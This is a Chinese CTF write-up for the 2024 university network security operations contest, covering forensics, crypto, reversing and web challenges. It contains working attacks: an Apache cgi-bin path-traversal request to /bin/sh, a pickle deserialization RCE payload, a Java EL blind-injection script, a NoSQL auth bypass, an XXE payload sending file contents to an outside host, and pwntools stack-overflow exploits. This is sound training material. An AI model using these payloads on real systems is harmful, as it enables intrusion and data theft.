---
title: 2024 首届高校网络安全管理运维赛 Writeup
contest: 2024 首届高校网络安全管理运维赛
year: 2024
difficulty: medium
vuln_type:
- misc_unknown
- sqli
- ssti
- xxe
- rop
- ret2libc
- deserialize
- web_unknown
tags:
- gif 帧分离 rot13
- 钓鱼邮件 base64
- 冰蝎 e45e329feb5d925b 默认密钥
- zip CRC 32 明文攻击
- sqlite 索引解析
- /cgi-bin/..%2e.. 路径穿越
- MongoDB $toString
- javax.script.ScriptEngineManager JS eval
- XXE php://filter base64
- z3 符号执行逆向
- 栈溢出 0x38 p64 backdoor
- 洗牌 instance m n 期望区分
attack_chain:
- 'Misc 签到: gif 帧分离 + rot13 解密 synt{fvtava-dhvm-jryy-qbar}'
- '钓鱼邮箱 Flag1: base64 解密发件人'
- '钓鱼邮箱 Flag2: base64 解密邮件内容'
- '钓鱼邮箱 Flag3: VirusTotal 查 foobar-edu-cn.com + SPF/DKIM/DMARC dnsspy'
- 'easyshell: 冰蝎默认密钥 e45e329feb5d925b 解倒数第二个 + CRC32 明文攻击 A8s123/+*'
- 'SecretDB: sqlite 格式解析 索引/值 + passwd_decode 自定义映射'
- /cgi-bin/..%2e 路径穿越到 /bin/sh 反弹 cat /fl*
- 'Pickle opcode: cconfig notadmin (S''admin'' S''yes'' u0(cconfig backdoor (S''exec...'') lo.'
- 'MongoDB: {"username": {"$toString": "admin"}} 1''||'
- 'Java EL: javax.script.ScriptEngineManager JS eval 盲注 /flag 字符'
- 'XXE: php://filter base64 /flag + 外部 dtd 二次回传'
- 'reverse: z3 解 4 段 32-bit 位运算 a1=0xe3c6235c a2=0x05d9434d a3=0x04b1edf3 a4=0x04034083'
- 'pwn: 栈溢出 0x38 + p64(0x40117A) backdoor / pwn03 admin+密码 0x9e 填充 + p64(0x40127E)'
- 'crypto: shuffle m n instance 蒙特卡洛 2000 次 → 1/0 期望区分 bit'
key_payload: POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
one_liner: 高校运维赛综合：签到 ROT13+钓鱼邮件+冰蝎+sqlite+路径穿越+Pickle+MongoDB+Java EL 盲注+XXE+z3+栈溢出+洗牌期望——运维/渗透/密码/取证全覆盖。
lesson: /cgi-bin/.%2e/ 路径穿越是 HTTPD 经典 CVE（CVE-2021-41773/CVE-2021-42013 同款），打 Apache httpd 时要记得试；Java EL 盲注用 `contains` 逐字符爆破比 time-based 快；洗牌密码用蒙特卡洛多次实验取期望差分判断 bit 是统计侧信道套路。
quality: high
full_path: 2024年首届高校网络安全管理运维赛Writeup.full.md
meta_path: 2024年首届高校网络安全管理运维赛Writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2024 首届高校网络安全管理运维赛 Writeup。高校运维赛综合：签到 ROT13+钓鱼邮件+冰蝎+sqlite+路径穿越+Pickle+MongoDB+Java EL 盲注+XXE+z3+栈溢出+洗牌期望——运维/渗透/密码/取证全覆盖。。关键路径：Misc 签到: gif 帧分离 + rot13 解密 synt{fvtava-dhvm-jryy-qbar} → 钓鱼邮箱 Flag1:...'
category: misc
subcategory: misc_other
subcategories:
- misc_other
- sql_injection
- ssti
- xxe
- rop
- stack_overflow
- deserialization
- web_other
tools_used:
- Java
- Z3
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: school
wp_url: https://www.ctfiot.com/179730.html
reasoning_chain:
- 触发点：gif 签到题 → 假设：帧分离 → 动作：convert gif frame_%d.png
- 观察：拿到 synt{fvtava-dhvm-jryy-qbar} → 触发点：rot13 提示 → 动作：rot13 解密 → flag1
- 触发点：钓鱼邮箱 Flag1 → 假设：base64 发件人 → 动作：base64 -d → flag1
- 动作：base64 解密邮件内容 → flag2
- 动作：VirusTotal 查 foobar-edu-cn.com + dnsspy SPF/DKIM/DMARC → flag3
- 触发点：easyshell 冰蝎默认密钥 → 假设：e45e329feb5d925b → 动作：解密倒数第二个
- 动作：CRC32 明文攻击 → 拿到密码 A8s123/+* → flag
- 触发点：SecretDB sqlite 格式 → 假设：解析索引 + passwd_decode → flag
- 触发点：/cgi-bin/..%2e..路径穿越 → 动作：打到 /bin/sh 反弹 → cat /fl*
- 触发点：Pickle opcode → 假设：构造 notadmin admin=yes + backdoor exec → flag
- 触发点：MongoDB $toString → 假设：admin={"$toString":"admin"} 1'|| → flag
- 触发点：Java EL javax.script.ScriptEngineManager JS eval 盲注 → flag
- 触发点：XXE php://filter base64 + 外部 dtd 二次回传 → flag
- 触发点：reverse z3 解 4 段 32-bit 位运算 + pwn 0x38 栈溢出 backdoor → flag
- 触发点：crypto shuffle m n instance 蒙特卡洛 2000 次 → 1/0 期望区分 bit → flag
failed_attempts:
- 试图 base64 邮箱内容硬猜 →失败：必须先 base64 解码
- 试图不打 easyshell 直接 cat /flag → 失败：必须冰蝎默认密钥解出明文
- 试图不打 /cgi-bin/..%2e 直接传 RCE → 失败：必须路径穿越到 /bin/sh
key_observations:
- /cgi-bin/.%2e/ 路径穿越是 HTTPD 经典 CVE（CVE-2021-41773 同款）
- Java EL 盲注用 contains 逐字符爆破比 time-based 快
- 洗牌密码用蒙特卡洛多次实验取期望差分判断 bit 是统计侧信道套路
- 冰蝎默认密钥 e45e329feb5d925b 是 WebShell 管理工具硬编码密钥
prerequisites:
- tshark 协议分析 + rot13
- 冰蝎 WebShell 默认密钥知识库
- CRC32 明文攻击（已知明文爆破）
- Java EL表达式盲注 + XXE OOB
---
# 2024年首届高校网络安全管理运维赛Writeup

> 原文: https://www.ctfiot.com/179730.html
> ID: 179730

Misc

签到

得到gif图片，分离gif，得到synt{fvtava-dhvm-jryy-qbar}

再根据图片提示，rot13⼀下得到flag

钓鱼邮箱识别

Flag1

base64解密发件人得到flag

Flag2

Base64解密邮箱内容得到flag

Flag3

通过VirusTotal查发件人域名foobar-edu-cn.com，发现提示

根据上面的提示想到邮箱的SPF、DKIM 和 DMARC身份认证协议

SPF

DKIM、DMARC(https://dnsspy.io/scan/foobar-edu-cn.com)

easyshell

过滤http流，发现冰蝎流量，使⽤冰蝎默认密钥 e45e329feb5d925b ，在倒数第二个解密，发现在读取secret.txt ⽂件，继续解密流量找到压缩包

发现crc值相同使用明文攻击，得到密码A8s123/+*

解压后得到flag

SecretDB

根据sqlite文件格式解析，提取索引和值

def passwd_decode(code) -> str:
 passwd_list = map(int, code.split('&'))
 result=[]
 for i in passwd_list:
  if 97 <= i <= 100 or 65 <= i <= 68:
   i += 22
  elif i > 57:
   i -= 4
  result.append(chr(i))
  #print(i, chr(i))
 return (''.join(result))
print(passwd_decode("106&112&101&107&127&101&104&49&57&56&53&56&54&56&49&51&51&105&56
&103&106&49&56&50&56&103&102&56&52&101&104&102&105&53&101&53&102&129"))
 # flag{ad1985868133e8cf1828cb84adbe5a5b}

POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Connection: close

echo;cat /fl*;

# urlencode

/nc

post body: port=80&data=[urlencode_data]

from base64 import b64encode
from urllib.parse import quote

def base64_encode(s: str, encoding='utf-8') -> str:
    return b64encode(s.encode()).decode(encoding=encoding)

exc = "raise Exception(__import__('os').popen('cat /fl*').read())"
exc = base64_encode(exc).encode()

opcode = b'''cconfig
notadmin
(S'admin'
S'yes'
u0(cconfig
backdoor
(S'exec(__import__("base64").b64decode(b"%s"))'
lo.''' % (exc)

print(quote(b64encode(opcode).decode())


```
def passwd_decode(code) -> str:
 passwd_list = map(int, code.split('&'))
 result=[]
 for i in passwd_list:
  if 97 <= i <= 100 or 65 <= i <= 68:
   i += 22
  elif i > 57:
   i -= 4
  result.append(chr(i))
  #print(i, chr(i))
 return (''.join(result))
print(passwd_decode("106&112&101&107&127&101&104&49&57&56&53&56&54&56&49&51&51&105&56
&103&106&49&56&50&56&103&102&56&52&101&104&102&105&53&101&53&102&129"))
 # flag{ad1985868133e8cf1828cb84adbe5a5b}
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Connection: close

echo;cat /fl*;

# urlencode

/nc

post body: port=80&data=[urlencode_data]
admin
1'||'
from base64 import b64encode
from urllib.parse import quote

def base64_encode(s: str, encoding='utf-8') -> str:
    return b64encode(s.encode()).decode(encoding=encoding)

exc = "raise Exception(__import__('os').popen('cat /fl*').read())"
exc = base64_encode(exc).encode()

opcode = b'''cconfig
notadmin
(S'admin'
S'yes'
u0(cconfig
backdoor
(S'exec(__import__("base64").b64decode(b"%s"))'
lo.''' % (exc)

print(quote(b64encode(opcode).decode())
{
"username":{
"$toString":"admin"
}
}
new javax.script.ScriptEngineManager().getEngineByName("JS").eval('a=(new ja'+'va.lang.String(jav'+'a.nio.file.Files.readAllBytes(ja'+'va.nio.file.Paths.get("/flag"))).contains("[Alphabet]"))?x:0')
import requests
url = ""
def istext(text):
 data = {"expr": '''new javax.script.ScriptEngineManager().getEngineByName("JS").eval('a=(new ja'+'va.lang.String(jav'+'a.nio.file.Files.readAllBytes(ja'+'va.nio.file.Paths.get("/flag"))).contains("''' + text + '''"))?x:0')'''}
 return len(requests.post(url,data).text) == 105
flag = "flag{"
for i in range(100):
 for j in "_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ}":
  if istext(flag + j):
   flag += j
   print(flag)
   break
  if j == "~":
   exit(1)
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://[IP]/tmp.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>

# File stored on http://[IP]/tmp.dtd

<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://[IP]/tmp.xml?
file=%data;'>">
from z3 import *

# 求解a1
a1 = 0xADB1D018 + 0x36145344
print(hex(a1))
a1 = 0xe3c6235c

# 求解a2
a2 = BitVec('a2', 32)
s = Solver()
s.add((a2 | 0x8E03BEC3) - 3 * (a2 & 0x71FC413C) + a2 == -1876131848)

if s.check() == sat:
    m = s.model()
    solution = m[a2].as_long()
    print(hex(solution))
a2 = 0x05d9434d

# 求解a3
a3 = BitVec('a3', 32)
s = Solver()
s.add(a3 < 0x10000000)
s.add(4*((~a3&0xA8453437)+2*~(~a3|0xA8453437))+-3*(~a3|0xA8453437)+3*~(a3|0xA8453437)-(-10*(a3&0xA8453437)+(a3^0xA8453437))==551387557)
if s.check() == sat:
    m = s.model()
    solution = m[a3].as_long()
    print(hex(solution))
a2 = 0x04b1edf3

# 求解a4
a4 = BitVec('a4', 32)
s = Solver()
s.add(a4<0x10000000)
# s.add(a4 < 0x84034083)  # 0xf4034083 0xc4034083 0x84034083
s.add(11*~(a4^0xE33B67BD)+4*~(~a4|0xE33B67BD)-(6*(a4&0xE33B67BD)+12*~(a4|0xE33B67BD))+3*(a4&0xD2C7FC0C)+(-5)*a4-(2*~(a4|0xD2C7FC0C))+(~(a4|0x2D3803F3))+(4*(a4&0x2D3803F3))-((-2)*(a4|0x2D3803F3))==(-837785892))
if s.check() == sat:
    m = s.model()
    solution = m[a4].as_long()
    print(hex(solution))
a4 = 0x04034083

    #flag{e3c6235c-05d9434d-04b1edf3-04034083}
from pwn import*
context(arch='amd64', os='linux',log_level="debug")

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("host",port)
    # elf = ELF(name)

get_p("./pwn")
backdoor = 0x040117A
payload = b"A"*0x38 + p64(backdoor)

p.sendlineafter("token","[token]")
p.sendafter("Enter",b"hacker")
p.sendafter("Enter",payload)
# gdb.attach(p,"")
p.interactive()
p.recvuntil("ed")
p.recv(1)
for i in range(0x10):
 data = p.recv(0x1000)
 if data == 0:
  break
 else:
  with open('output', 'a', encoding='latin-1') as file:
   file.write(data.decode('latin-1'))
from pwn import *
p = remote('prob03.contest.pku.edu.cn:
10004')
p.sendlineafter("Please input your token: ","[token]")
p.sendlineafter("Username: ","adminn")
debug(p,0x401431)
payload=b"adminn"
payload+=b'1q2w3e4r'
payload=payload.ljust(0x9e,b'b')
payload+=p64(0x40127E)
p.sendlineafter("Password: ",payload)
p.interactive()
from random import shuffle
from tqdm import tqdm
from Crypto.Util.number import *
def instance(m, n):
    start = list(range(m))
    shuffle(start)
    for i in range(m):
        now = start[i]
        this_turn = False
        for j in range(n-1):
            if now == i:
                this_turn = True
                break
            now = start[now]
        if not this_turn:
            #
            return 0
    return 1
def leak(m, n, times=2000):
    message = [instance(m, n) for _ in range(times)]
    return message

with open(r"data.txt",'r')as f:
    f=f.read()
f=eval(f)
print(len(f))
result_=[]

for a, b,result in tqdm(f):
    # print(tmp_m0,tmp_n0,tmp_m1,tmp_n1)
    count1=leak(a[0],a[1])
    count2=leak(b[0],b[1])
    a_,b_,c_=sum(count1),sum(count2),sum(result)
    if abs(c_-b_)>abs(c_-a_):#满足条件和a_更接近,说明是bit为0

        result_.append("0")
    else:
        result_.append("1")#反之和b_更接近，也就是1

print(result_)
print(long_to_bytes(int("".join(result_),2)))
    #flag{this_1s_the_sEcret_f1ag}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]